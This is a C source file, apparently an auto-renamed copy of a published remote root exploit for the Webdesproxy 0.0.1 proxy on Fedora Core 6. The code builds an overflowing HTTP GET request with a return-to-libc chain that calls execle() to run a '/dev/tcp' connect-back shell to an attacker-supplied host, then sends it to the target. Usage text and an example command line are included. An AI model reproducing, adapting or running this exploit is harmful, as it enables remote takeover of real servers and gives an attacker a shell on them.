#define NULL ((void*)0)
typedef unsigned long size_t;  // Customize by platform.
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;  // Either arithmetic or pointer type.
/* By default, we understand bool (as a convenience). */
typedef int bool;
#define false 0
#define true 1

/* Forward declarations */

/* Type definitions */
struct in_addr {int dummy; } ;
struct sockaddr_in {int /*<<< orphan*/  sin_zero; struct in_addr sin_addr; int /*<<< orphan*/  sin_port; int /*<<< orphan*/  sin_family; } ;
struct sockaddr {int dummy; } ;
struct hostent {scalar_t__ h_addr; } ;
typedef  int /*<<< orphan*/  ex_buf ;

/* Variables and functions */
 int /*<<< orphan*/  AF_INET ; 
 long BIN_SH_END ; 
 long BIN_SH_LOC ; 
 long CONN_BACK_LOC ; 
 long C_OPTION_END ; 
 long C_OPTION_LOC ; 
 long EXECLE_00_0xff ; 
 long EXECLE_08_0xff ; 
 long EXECLE_16_0xff ; 
 long EXIT_GOT ; 
 long EXIT_PLT ; 
 long MOVE_ESP ; 
 long NULL_STR ; 
 long RET_CODE ; 
 int RET_CODE_COUNT ; 
 int /*<<< orphan*/  SOCK_STREAM ; 
 long STRCPY_PLT ; 
 int FUNC0 (char*) ; 
 int /*<<< orphan*/  FUNC1 (int /*<<< orphan*/ *,int) ; 
 int /*<<< orphan*/  FUNC2 (int) ; 
 int FUNC3 (int,struct sockaddr*,int) ; 
 int /*<<< orphan*/  FUNC4 (int /*<<< orphan*/ ) ; 
 struct hostent* FUNC5 (char*) ; 
 int /*<<< orphan*/  FUNC6 (int) ; 
 int /*<<< orphan*/  FUNC7 (char*,int /*<<< orphan*/ ,int) ; 
 int /*<<< orphan*/  FUNC8 (char*,...) ; 
 int /*<<< orphan*/  FUNC9 (int,unsigned char*,int,int /*<<< orphan*/ ) ; 
 int FUNC10 (int /*<<< orphan*/ ,int /*<<< orphan*/ ,int /*<<< orphan*/ ) ; 
 int /*<<< orphan*/  FUNC11 (unsigned char*,char*,...) ; 
 int FUNC12 (unsigned char*) ; 

int FUNC13(int argc,char *argv[]){
	int i=0,l=0,sock;
	unsigned char ex_buf[4096];

	struct hostent *se;
	struct sockaddr_in saddr;

	FUNC7((char *)ex_buf,0,sizeof(ex_buf));
	FUNC8("\n Fedora Core 6 (exec-shield) based\n"
		" Webdesproxy (webdesproxy-0.0.1.tgz) remote root exploit\n"
		" by Xpl017Elz\n\n");

	if(argc<6){
		FUNC8(" Usage: %s [host] [port] [conn-back host] [input port] [output port]\n",argv[0]);
		FUNC8(" Example: %s webdesproxy.host.co.kr 8080 hax0r.kr 8282 8383\n\n",argv[0]);
		return -1;
	}

	FUNC11(ex_buf,"GET http://");
	l=FUNC12(ex_buf);
	for(i=0;i<220;i++){
		ex_buf[l++]=0x78;
	}
	i=0;

	FUNC8(" [+] make execle() address.\n");
	{
		/* (execle()>>0)&0xff */
		*(long *)&ex_buf[l]=STRCPY_PLT;
		l+=4;
		*(long *)&ex_buf[l]=MOVE_ESP;
		l+=4;
		*(long *)&ex_buf[l]=EXIT_GOT+i++;
		l+=4;
		*(long *)&ex_buf[l]=EXECLE_00_0xff;
		l+=4;
		/* (execle()>>8)&0xff */
		*(long *)&ex_buf[l]=STRCPY_PLT;
		l+=4;
		*(long *)&ex_buf[l]=MOVE_ESP;
		l+=4;
		*(long *)&ex_buf[l]=EXIT_GOT+i++;
		l+=4;
		*(long *)&ex_buf[l]=EXECLE_08_0xff;
		l+=4;
		/* (execle()>>16)&0xff */
		*(long *)&ex_buf[l]=STRCPY_PLT;
		l+=4;
		*(long *)&ex_buf[l]=MOVE_ESP;
		l+=4;
		*(long *)&ex_buf[l]=EXIT_GOT+i++;
		l+=4;
		*(long *)&ex_buf[l]=EXECLE_16_0xff;
		l+=4;
	}
	/* #1 make null byte */
	*(long *)&ex_buf[l]=STRCPY_PLT;
	l+=4;
	*(long *)&ex_buf[l]=MOVE_ESP;
	l+=4;
	*(long *)&ex_buf[l]=BIN_SH_END; // "/bin/sh\0"
	l+=4;
	*(long *)&ex_buf[l]=NULL_STR;
	l+=4;

	/* #2 make null byte */
	*(long *)&ex_buf[l]=STRCPY_PLT;
	l+=4;
	*(long *)&ex_buf[l]=MOVE_ESP;
	l+=4;
	*(long *)&ex_buf[l]=C_OPTION_END; // "-c\0"
	l+=4;
	*(long *)&ex_buf[l]=NULL_STR;
	l+=4;

	FUNC8(" [+] execle() argument align padddding...\n");
	for(i=0;i<RET_CODE_COUNT;i++){
		*(long *)&ex_buf[l]=RET_CODE; /* ret(pop %eip) code */
		l+=4;
	}

	FUNC8(" [+] make execute command.\n");
	{
		/*
		** --
		** execle("/bin/sh","/bin/sh","-c",conn-back_shell,0x00000000,0x00000000);
		** --
		*/
		*(long *)&ex_buf[l]=EXIT_PLT; /* exit PLT */
		l+=4;
		*(long *)&ex_buf[l]=0x82828282; /* dummy */
		l+=4;
		*(long *)&ex_buf[l]=BIN_SH_LOC; /* argv[0] */
		l+=4;
		*(long *)&ex_buf[l]=BIN_SH_LOC; /* argv[1] */
		l+=4;
		*(long *)&ex_buf[l]=C_OPTION_LOC; /* argv[2] */
		l+=4;
		*(long *)&ex_buf[l]=CONN_BACK_LOC; /* argv[3] */
		l+=4;
	}

	FUNC8(" [+] make connect-back shell command.\n");
	{
		/* overwrite .bss section */
		FUNC11(ex_buf+l,"/bin/shx-cxsh</dev/tcp/%s/%d>/dev/tcp/%s/%d;\n",argv[3],FUNC0(argv[4]),argv[3],FUNC0(argv[5]));
		l=FUNC12(ex_buf);
	}

	FUNC8(" [+] connect host: %s:%d.\n",argv[1],FUNC0(argv[2]));
	se=FUNC5(argv[1]);
	if(se==NULL){
		FUNC8(" [-] gethostbyname() error.\n\n");
		return -1;
	}
	sock=FUNC10(AF_INET,SOCK_STREAM,0);
	if(sock==-1){
		FUNC8(" [-] socket() error.\n\n");
		return -1;
	}
	saddr.sin_family=AF_INET;
	saddr.sin_port=FUNC6(FUNC0(argv[2]));
	saddr.sin_addr=*((struct in_addr *)se->h_addr);
	FUNC1(&(saddr.sin_zero),8);

	i=FUNC3(sock,(struct sockaddr *)&saddr,sizeof(struct sockaddr));
	if(i==-1){
		FUNC8(" [-] connect() error.\n\n");
		return -1;
	}

	FUNC8(" [+] exploit size: %d.\n",l);
	FUNC8(" [+] send exploit.\n");
	FUNC9(sock,ex_buf,l,0);
	FUNC2(sock);

	FUNC8(" [*] checking, your connect-back host. :-}\n\n");
	FUNC4(0);
}